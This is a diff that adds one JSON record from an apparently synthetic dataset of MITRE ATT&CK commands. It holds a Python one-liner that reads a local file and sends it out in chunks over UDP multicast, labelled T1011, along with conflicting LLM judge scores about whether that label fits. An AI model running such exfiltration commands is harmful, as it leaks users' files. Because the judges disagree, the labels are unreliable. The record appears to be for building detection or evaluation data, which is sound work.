@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP); s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 1); addr=(\"239.197.3.9\", 49321); d=open(\"/Users/Shared/.localstate\",\"rb\").read(); [s.sendto(d[i:i+800], addr) for i in range(0,len(d),800)]; s.close()'",
+  "explanation": "Uses IPv4 multicast UDP to an administratively scoped group at a high, uncommon port. Multicast is a network medium distinct from a typical point-to-point C2 channel, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and set multicast TTL for local-scope distribution.",
+    "Use an admin-scoped multicast group with a non-standard port (49321).",
+    "Read and send file data in small chunks over multicast (alternate medium).",
+    "Operate under user privileges without obfuscation."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-4af474d6",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed with balanced syntax, valid function calls, and proper statement separation, runnable as-is.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration via UDP multicast, which is a network communication technique, entirely unrelated to 'Establish Accounts' (T1011), which focuses on account creation or abuse.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T08:26:56.659642Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for Python socket programming, list comprehension, and file operations.",
+        "semantic_score": 2,
+        "semantic_justification": "The command implements exfiltration over UDP multicast rather than establishing accounts as described in T1011, showing a significant misalignment between the command's function (data exfiltration) and the claimed technique (account establishment).",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T08:26:59.931306Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Python one-liner with balanced quotes, proper statement separators, and correct socket API usage.",
+        "semantic_score": 5,
+        "semantic_justification": "Reads a file and exfiltrates it via UDP multicast in chunks, aligning with T1011-style exfiltration over an alternative network medium (despite the mismatched account-creation description).",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T08:27:22.075791Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
